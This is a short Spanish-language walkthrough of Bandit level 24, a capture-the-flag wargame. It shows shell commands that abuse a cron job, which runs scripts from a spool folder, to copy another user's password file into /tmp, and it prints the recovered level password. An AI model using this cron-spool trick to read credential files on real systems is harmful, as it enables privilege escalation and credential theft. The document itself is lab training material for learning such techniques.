# Bandit Walkthrough

## Bandit 24

Un programa se está ejecutando automáticamente a intervalos regulares desde cron, el programador de trabajos basado en el tiempo. Busca en `/etc/cron.d/` la configuración y verifica qué comando se está ejecutando.

**NOTA:** Este nivel requiere que crees tu propio primer script de shell. ¡Este es un gran paso y deberías sentirte orgulloso de ti mismo cuando superes este nivel!

**NOTA 2:** Ten en cuenta que tu script de shell se elimina una vez que se ejecuta, por lo que quizás quieras guardar una copia.

Lista de comandos:

```bash
##Entramos al directorio
cd /etc/cron.d
##Vemos el archivo de este nivel
cat cronjob_bandit24
##Vemos como es el script que se esta ejecutando y que hace
cat /usr/bin/cronjob_bandit24.sh
#Creamos un directorio tmp para trabajar
mkdir /tmp/juanma
cd /tmp/juanma
##Creamos un archivo con un script que manda la contraseña a otro archivo que vamos a crear
touch pasador.sh
##Damos permisos de ejecucion
chmod 700 pasador.sh 
##Hacemos el script
nano pasador.sh 
#!/bin/bash 
cat /etc/bandit_pass/bandit24 > /tmp/juanma/clave

##Copiamos el script al directorio que se esta ejecutando
cp pasador.sh /var/spool/bandit24/foo/
##Vemos la contraseña que se ha enviado al archivo clave
cat clave

```
Contraseña: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

